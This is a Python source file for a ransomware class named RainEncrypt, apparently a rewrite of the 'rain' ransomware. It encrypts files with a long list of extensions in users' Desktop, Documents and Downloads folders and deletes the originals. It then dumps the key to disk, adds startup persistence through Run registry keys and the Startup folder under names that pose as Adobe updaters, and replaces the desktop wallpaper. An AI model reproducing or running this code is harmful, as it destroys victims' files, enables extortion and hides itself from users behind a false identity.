from os import getenv, system, path
from Crypto import Random
import platform
from shutil import copyfile
from winreg import *
from .core.crypto import Crypto
from .core.directory_iter import DirectoryIter


class RainEncrypt:
    """
    Class executes the main bulk of the rain ransom-wares payload, I believe the extra
    utc and av disabling functionality are in bat files but can be ported

    Example Usage:

        RainEncrypt().do_final()

    """
    __APPDATA = getenv('APPDATA')
    __EXT = (i.replace("*", "") for i in
             ['*.txt', '*.lnk', '*.application', '*.veg', '*.doc', '*.pdf', '*.jpg', '*.gif', '*.png', '*.bitmap'
                 , '*.mp4', '*.avi', '*.zip', '*.wav', '*.svg', '*.mdb', '*.rar', '*.tar', '*.xf', '*.gz'
                 , '*.sqlite3', '*.mov', '*.pptx', '*.pptm', '*.xlsx', '*.xlsm', '*.aes', '*.accdb', '*.bmp'
                 , '*.mpeg', '*.sql', '*.sqlitedb', '*.jar', '*.java', '*.cdr', '*.vssettings', '*.vbs', '*.vssx'
                 , '*.cpp', '*.c', '*.NET', '*.rb', '*.sh', '*.appref-ms', '*.html', '*.css', '*.sublime-package'
                 , '*.bz2', '*.iso', '*.img', '*.sfk', '*.mkv', '*.psd', '*.xz', '*.7z', '*.gz', '*.mid', '*.wmv'
                 , '*.mov', '*.cdr', '*.ai', '*.tif', '*.fla', '*.swf', '*.dwg', '*.mpg', '*.xls', '*.docx', '*.rtf'
                 , '*.pps', '*.ppt', '*.pptx', '*.ppsx', '*.ico', '*.3gp', '*.dxf', '*.eps', '*.max', '*.nrg', '*.ogg'
                 , '*.pic', '*.php', '*.qxd', '*.rm', '*.swf', '*.vob', '*.wri', '*.vbs', '*.chc', '*.real', '*.list'
                 , '*.desktop', '*.so', '*.json', '*.new', '*.bkp', '*.bak', '*.tmp', '*.gho', '*.mp3'])

    def __init__(self, password: str = Random.new().read(32)):
        self.crypto = Crypto(password, ".rain")
        self.paths = (path.expanduser('~/Desktop'),
                      path.expanduser('~/Área de trabalho'),
                      path.expanduser('~/Documents'),
                      path.expanduser('~/Documentos'),
                      path.expanduser('~/Downloads'))

    def __enable_run_at_start_windows(self, self_file_name: str):
        """
        Windows only function

        Not entirely sure on the logic here and why the need for 3 start up locations
        I copied it from your original code and removed a copy to documents

        :param self_file_name: file to stat up at logon
        """

        copyfile(self_file_name, 'C:/Users/Public/AdobeAAMUpdater.exe')
        copyfile(self_file_name,
                 self.__APPDATA + r'\Microsoft\Windows\Start Menu\Programs\Startup\AdobeAAMCCUpdater.exe')
        try:
            # this will start up for all users, not recommended unless shared folders such as ProgramFiles are targeted
            key = CreateKey(HKEY_LOCAL_MACHINE, r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run')  # privileged request
        except PermissionError:
            # in case program is not admin, startup will only run for current user this makes more sense
            # as only the current users docs, desktop, etc are encrypted
            key = CreateKey(HKEY_CURRENT_USER, r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run')

        SetValueEx(key, "AdobeAAM", 0, REG_SZ, 'C:\\Users\\Public\\AdobeAAMUpdater.exe')
        SetValueEx(key, "AdobeAAMCC", 0, REG_SZ,
                   self.__APPDATA + '\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\AdobeAAMUpdater.exe')

    def __set_back_ground_windows(self, bg: bytes):
        open("bg.jpg", 'wb').write(bg)
        copyfile("bg.jpg",
                 self.__APPDATA + "\\Microsoft\\Windows\\Themes\\TranscodedWallpaper")  # not sure if this correct

        # refresh explorer
        system("taskkill /f /IM explorer.exe")
        system("start C:/Windows/explorer.exe")

    def __infect_all(self):
        """
        Walk directories directories specified in self.paths and encrypt files
        """
        for path_ in self.paths:
            for file in DirectoryIter(path_).iter_files(path_):
                self.__crypt(file)

    def __crypt(self, file_name: str):
        """
        Checks if file ends with extension to encrypt, then encrypts in place (deletes original)

        :param file_name: file to encrypt
        """
        for ext in self.__EXT:
            if file_name.endswith(ext):  # checks if file is in list of extensions to encrypt
                self.crypto.encrypt_file(file_name, inplace=True)

    def do_final(self, to_run_at_startup=str()):
        """
        Consider this the entry point, will encrypt target files
        then change background and adds startup entries (depending on platform)
        """
        self.__infect_all()  # encrypt all target location works for both windows an linux
        self.crypto.dump_key()  # dumps aes password to disk (required for decrypt)
        del self.crypto  # delete encryption object (helps keep keys out of memory but not reliable)

        if platform.system() == "windows":  # windows only functions

            if to_run_at_startup:  # if a startup path was specified
                self.__enable_run_at_start_windows(to_run_at_startup)  # run another path at startup e.g. gui

            self.__set_back_ground_windows(open("bg.jpg", "rb").read())  # replace background
